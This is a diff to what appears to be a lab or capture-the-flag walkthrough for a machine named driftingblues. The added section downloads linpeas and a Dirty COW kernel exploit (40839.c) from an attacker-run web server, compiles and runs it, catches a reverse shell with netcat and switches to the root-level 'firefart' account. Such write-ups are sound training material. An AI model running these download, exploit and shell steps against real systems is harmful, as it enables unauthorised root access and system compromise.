@@ -1112,8 +1112,8 @@ Moving forward I decided to launch linpeas for finding privilege escalation vect
 
 ```
 $ wget http://IP:8000/linpeas.sh 
---2025-02-14 16:19:10--  http://192.168.45.174:8000/linpeas.sh
-Connecting to 192.168.45.174:8000... connected.
+--2025-02-14 16:19:10--  http://IP:8000/linpeas.sh
+Connecting to IP:8000... connected.
 HTTP request sent, awaiting response... 200 OK
 Length: 839912 (820K) [text/x-sh]
 Saving to: `linpeas.sh'
@@ -1149,5 +1149,66 @@ After looking into the operating system's version, I managed to find a relevant 
 
 ![](attachments/Pasted%20image%2020250214222519.png)
 
+I was then able to exploit the existing kernel vulnerability escalate my privileges on the machine to become root
 
+```
+$ wget http://IP:8000/40839.c
+--2025-02-14 16:26:36--  http://IP:8000/40839.c
+Connecting to IP:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 5006 (4.9K) [text/x-csrc]
+Saving to: `40839.c'
+
+     0K ....                                                  100% 1.14M=0.004s
+
+2025-02-14 16:26:36 (1.14 MB/s) - `40839.c' saved [5006/5006]
+
+$ gcc 40839.c -o exploit
+/tmp/cca3U2mN.o: In function `generate_password_hash':
+40839.c:(.text+0x1e): undefined reference to `crypt'
+/tmp/cca3U2mN.o: In function `main':
+40839.c:(.text+0x4cd): undefined reference to `pthread_create'
+40839.c:(.text+0x501): undefined reference to `pthread_join'
+collect2: error: ld returned 1 exit status
+$ chmod +x exploit
+chmod: cannot access `exploit': No such file or directory
+$ gcc -pthread 40839.c -o dirty -lcrypt
+$ chmod +x dirty
+$ ./dirty
+Please enter the new password: test
+
+id
+
+^C
+                                                                                                                              
+┌──(kali㉿kali)-[~/Downloads]
+└─$ nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [IP] from (UNKNOWN) [192.168.189.219] 37008
+Linux driftingblues 3.2.0-4-amd64 #1 SMP Debian 3.2.78-1 x86_64 GNU/Linux
+ 16:28:17 up  2:28,  0 users,  load average: 0.57, 0.15, 0.09
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ su firefart
+su: must be run from a terminal
+$ python -c 'import pty; pty.spawn("/bin/bash")'
+www-data@driftingblues:/$ su firefart
+su firefart
+Password: test
+
+firefart@driftingblues:/# id
+id
+uid=0(firefart) gid=0(root) groups=0(root)
+firefart@driftingblues:/# whoami
+whoami
+firefart
+firefart@driftingblues:/# cd /root
+cd /root
+firefart@driftingblues:~# pwd
+pwd
+/root
+firefart@driftingblues:~# 
+
+```
 
